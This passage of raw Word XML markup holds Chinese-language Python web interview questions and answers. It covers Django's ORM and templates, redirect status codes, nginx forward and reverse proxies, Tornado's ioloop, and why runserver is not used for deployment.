          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的认识？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE1D06E"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是走大而全的方向，它最出名的是其全自动化的管理后台：只需要使用起</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，做简单的对象定义，它就能自动生成数据库结构、以及全功能的管理后台。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B05DCF6"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内置的</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>跟框架内的其他模块耦合程度高。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AFA8A68"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应用程序必须使用</w:t>
      </w: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内置的</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，否则就不能享受到框架内提供的种种基于其</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的便利；理论上可以切换掉其</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>模块，但这就相当于要把装修完毕的房子拆除重新装修，倒不如一开始就去毛胚房做全新的装修。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="089C84BC"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的卖点是超高的开发效率，其性能扩展有限；采用</w:t>
      </w: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的项目，在流量达到一定规模后，都需要对其进行重构，才能满足性能的要求。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="779CE8AD"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适用的是中小型的网站，或者是作为大型网站快速实现产品雏形的工具。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59972085"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Django</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>模板的设计哲学是彻底的将代码、样式分离；</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>从根本上杜绝在模板中进行编码、处理数据的可能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15C768E8" w14:textId="06556713"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w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>7</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Django</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>重定向你是如何实现的？用的什么状态码？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E1056EA"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使用</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HttpResponseRedirect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73E2FF2F"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redirect</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>reverse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6664A668"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状态码：</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>302,301</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E50D932" w14:textId="49209383"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008</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ngnix</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的正向代理与反向代理？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EA91ED8"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lastRenderedPageBreak/>
        <w:t>正向代理</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是一个位于客户端和原始服务器</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(origin server)</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>原始服务器</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端必须要进行一些特别的设置才能使用正向代理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79110979"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反向代理正好相反，对于客户端而言它就像是原始服务器，并且客户端不需要进行任何特别的设置。客户端向反向代理的命名空间中的内容发送普通请求，接着反向代理将判断向何处</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>原始服务器</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>转交请求，并将获得的内容返回给客户端，就像这些内容原本就是它自己的一样。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DA57253" w14:textId="741C14AD"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009</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 xml:space="preserve">Tornado </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的核是什么？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F1FAE4B" w14:textId="77777777" w:rsidR="005D1318" w:rsidRPr="005D1318" w:rsidRDefault="005D1318" w:rsidP="005D1318">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="34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 xml:space="preserve">Tornado </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的核心是</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> ioloop </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> iostream </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>这两个模块，前者提供了一个高效的</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> I/O </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>事件循环，后者则封装了</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>一个无阻塞的</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> socket </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。通过向</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> ioloop </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中添加网络</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> I/O </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>事件，利用无阻塞的</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> socket </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，再搭配相应的回调</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>函数，便可达到梦寐以求的高效异步执行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D6E72C7" w14:textId="743DE1E2" w:rsidR="005D1318" w:rsidRPr="005D1318" w:rsidRDefault="005D1318" w:rsidP="005D1318">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010</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Django </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>本身提供了</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> runserver</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，为什么不能用来部署？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0135F5C4"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 xml:space="preserve">runserver </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法是调试</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>时经常用到的运行方式，它使用</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>自带的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E221FE5"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 xml:space="preserve">WSGI Server </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>运行，主要在测试和开发中使用，并且</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> runserver </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>开启的方式也是单进程</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E2E56CE" w14:textId="77777777"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 xml:space="preserve"> uWSGI </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是一个</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Web </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服务器，它实现了</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> WSGI </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>协议、</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>uwsgi</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">http </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>等协议。注意</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> uwsgi </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是一种通信协议，而</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
